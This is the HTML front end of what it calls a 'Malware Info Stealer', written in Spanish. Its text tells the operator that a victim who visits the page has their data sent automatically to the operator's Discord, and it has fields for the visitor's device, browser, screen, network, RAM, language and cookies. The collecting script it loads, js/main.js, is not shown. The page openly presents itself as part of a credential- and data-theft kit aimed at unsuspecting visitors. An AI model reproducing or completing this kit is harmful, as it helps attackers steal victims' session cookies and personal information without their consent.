<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malware Stealer v2</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

    <h1>Malware Info Stealer</h1>

    <div class="container">
        <p style="text-align: center;">La víctima entra aquí y los datos viajan automáticamente a tu Discord.</p>

        <div class="data-grid">
            <div class="data-item">
                <label>Dispositivo</label>
                <span id="device">Cargando...</span>
            </div>
            <div class="data-item">
                <label>Navegador</label>
                <span id="browser">Cargando...</span>
            </div>
            <div class="data-item">
                <label>Pantalla</label>
                <span id="screen">Cargando...</span>
            </div>
            <div class="data-item">
                <label>Tipo de Red</label>
                <span id="network">Cargando...</span>
            </div>
            <div class="data-item">
                <label>Memoria RAM</label>
                <span id="ram">Cargando...</span>
            </div>
            <div class="data-item">
                <label>Idioma</label>
                <span id="lang">Cargando...</span>
            </div>
            <div class="data-item" style="grid-column: span 2;">
                <label>Cookies</label>
                <span id="cookies">Cargando...</span>
            </div>
        </div>
    </div>

    <script src="js/main.js"></script>
</body>
</html>
